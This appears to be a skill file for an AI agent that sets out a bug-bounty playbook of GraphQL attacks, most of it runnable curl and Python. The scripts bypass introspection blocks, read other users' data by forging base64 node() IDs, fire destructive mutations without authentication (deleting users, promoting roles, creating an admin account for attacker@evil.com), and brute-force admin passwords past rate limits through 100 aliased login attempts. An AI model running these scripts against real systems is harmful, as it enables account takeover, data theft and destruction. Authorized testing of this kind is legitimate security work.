---
name: k1nzr3c0n-hunt-graphql
description: "GraphQL attack skill built from 12 disclosed bug bounty reports. Covers introspection bypass, IDOR via node(), cross-tenant mutations, REST/GraphQL desync, batch abuse, alias batching races, query depth/complexity DoS, field suggestion enumeration."
tags: [graphql, hunt, web-security, bug-bounty]
report_count: 12
---

# K1NZR3C0N Hunt — GraphQL

> **Introspection alone = never-submit** (unless schema reveals sensitive internal structure).
> **IDOR via node()**: GraphQL node() interface often bypasses type-level authorization.

---

## Crown Jewels

```
Priority 1 — Cross-tenant data via node() ID manipulation
Priority 2 — Mutations accessible without auth (or wrong auth level)
Priority 3 — Alias batching to bypass rate limiting (brute force via aliases)
Priority 4 — Batch introspection bypass when direct introspection blocked
Priority 5 — REST/GraphQL desync: REST endpoint hidden behind GraphQL resolver
```

---

## Phase 0 — Discover GraphQL

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_gql_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

echo "=== GraphQL Endpoint Discovery ==="
for EP in /graphql /api/graphql /v1/graphql /gql /query /graphiql /playground; do
  STATUS=$(curl -sk -o /dev/null -w '%{http_code}' "https://${TARGET}${EP}")
  [ "$STATUS" -lt 400 ] && echo "  [$STATUS] $EP"
done

# POST probe (some GQL rejects GET)
GQL_EP="${GQL_ENDPOINT:-https://${TARGET}/graphql}"
curl -sk -X POST "$GQL_EP" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __typename }"}' | python3 -m json.tool 2>/dev/null | head -5
```

## Phase 1 — Introspection

```bash
echo "=== GraphQL Introspection ==="
GQL_EP="${GQL_ENDPOINT:-https://${TARGET}/graphql}"
SESSION_COOKIE="${SESSION_COOKIE:-}"

# Full introspection
curl -sk -X POST "$GQL_EP" \
  -H "Content-Type: application/json" \
  -H "Cookie: ${SESSION_COOKIE}" \
  -d '{"query": "{ __schema { types { name fields { name type { name kind ofType { name kind } } args { name type { name } } } } } }"}' \
  | python3 -m json.tool 2>/dev/null > "$HUNT/schema.json" 2>/dev/null
[ -s "$HUNT/schema.json" ] && echo "  [+] Schema saved: $HUNT/schema.json" || echo "  Introspection blocked"

# Bypass: newline in query (some filters strip __schema but not with \n)
curl -sk -X POST "$GQL_EP" \
  -H "Content-Type: application/json" \
  -H "Cookie: ${SESSION_COOKIE}" \
  -d '{"query": "{\n__schema\n{types{name}}}"}' | grep -i 'type' | head -5

# Field suggestion (even if introspection blocked)
curl -sk -X POST "$GQL_EP" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ usr { id } }"}' 2>/dev/null | \
  grep -oP '"Did you mean.*?"' | head -10

echo ""
echo "=== Enumerate Sensitive Types from Schema ==="
[ -f "$HUNT/schema.json" ] && \
  python3 -c "
import json, sys
try:
    s = json.load(open('$HUNT/schema.json'))
    types = s.get('data',{}).get('__schema',{}).get('types',[])
    for t in types:
        name = t.get('name','')
        if any(k in name.lower() for k in ['user','admin','password','secret','token','payment','order','invoice']):
            print(f'  [SENSITIVE] {name}: {[f[\"name\"] for f in t.get(\"fields\") or []]}')
except: pass
"
```

## Phase 2 — IDOR via node()

```bash
echo "=== IDOR via node() Global ID ==="
GQL_EP="${GQL_ENDPOINT:-https://${TARGET}/graphql}"
ACCT2_ID="${ACCT2_ID:-2}"

# GraphQL global IDs are base64(Type:ID)
for TYPE in User Account Order Invoice Admin; do
  GLOBAL_ID=$(echo -n "${TYPE}:${ACCT2_ID}" | base64)
  RESP=$(curl -sk -X POST "$GQL_EP" \
    -H "Content-Type: application/json" \
    -H "Cookie: ${SESSION_COOKIE:-}" \
    -d "{\"query\": \"{ node(id: \\\"${GLOBAL_ID}\\\") { id ... on ${TYPE} { email name phone } } }\"}")
  echo "$RESP" | python3 -m json.tool 2>/dev/null | grep -E '"email"|"phone"|"name"' | \
    head -3 | sed "s/^/  [${TYPE}:${ACCT2_ID}] /"
done
```

## Phase 3 — Unauthorized Mutations

```bash
echo "=== Unauthorized Mutation Testing ==="
GQL_EP="${GQL_ENDPOINT:-https://${TARGET}/graphql}"

# Extract mutation names from schema
[ -f "$HUNT/schema.json" ] && \
  python3 -c "
import json
try:
    s = json.load(open('$HUNT/schema.json'))
    types = s.get('data',{}).get('__schema',{}).get('types',[])
    for t in types:
        if t.get('name') == 'Mutation':
            for f in (t.get('fields') or []):
                print(f'  mutation: {f[\"name\"]}({[a[\"name\"] for a in (f.get(\"args\") or [])]})')
except: pass
" | head -20

# Test sensitive mutations without auth
for MUTATION in \
  '{ deleteUser(id: "1") { success } }' \
  '{ updateUserRole(id: "1", role: "admin") { success } }' \
  '{ resetPassword(email: "admin@target.com") { token } }' \
  '{ createAdmin(email: "attacker@evil.com", password: "pwned123") { id } }'; do
  
  RESP=$(curl -sk -X POST "$GQL_EP" \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"mutation ${MUTATION}\"}")
  echo "$RESP" | grep -qiE '"data":\s*\{' && echo "  [MUT HIT] ${MUTATION:0:60}"
done
```

## Phase 4 — Alias Batching (Rate Limit Bypass)

```bash
echo "=== Alias Batching — Rate Limit Bypass ==="
GQL_EP="${GQL_ENDPOINT:-https://${TARGET}/graphql}"

# Single request with 100 aliases = 100 brute force attempts bypassing per-request rate limit
BATCH_QUERY='{"query": "mutation {'
for I in $(seq 1 100); do
  BATCH_QUERY+="a${I}: login(email: \"admin@${TARGET}\", password: \"Password${I}!\") { token }"
done
BATCH_QUERY+='}"}'

RESP=$(curl -sk -X POST "$GQL_EP" \
  -H "Content-Type: application/json" \
  -d "$BATCH_QUERY")
echo "$RESP" | python3 -m json.tool 2>/dev/null | grep '"token"' | head -3
echo "  [!] If any alias returns a non-null token → brute-forced valid password"
```

## Phase 5 — Batch Introspection When Blocked

```bash
echo "=== Batch Introspection Bypass ==="
GQL_EP="${GQL_ENDPOINT:-https://${TARGET}/graphql}"

# Array of operations — some firewalls only block standalone introspection
curl -sk -X POST "$GQL_EP" \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{ __schema { types { name } } }"},
    {"query": "{ __typename }"}
  ]' | python3 -m json.tool 2>/dev/null | grep '"name"' | head -20

# Fragment-based introspection bypass
curl -sk -X POST "$GQL_EP" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ ...F } fragment F on Query { __schema { types { name } } }"}' \
  | python3 -m json.tool 2>/dev/null | grep '"name"' | head -10
```

## Gate 0

```bash
echo "=== GraphQL Gate 0 ==="
echo "  □ node() IDOR: other user's data returned (not own)"
echo "  □ Mutation: state actually changed server-side"
echo "  □ Alias batching: at least one alias returned success/token"
echo "  □ Introspection alone: only submit if schema reveals auth bypass or sensitive data"
echo "  □ Two-account rule for IDOR: victim/attacker are different users"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
GraphQL IDOR via node() allows authenticated user to query any user's private data by guessing base64-encoded global ID
GraphQL alias batching bypasses rate limiting on [/graphql] login mutation — 100 password attempts in single request
Unauthenticated GraphQL mutation [createAdmin] allows account creation with admin role
```
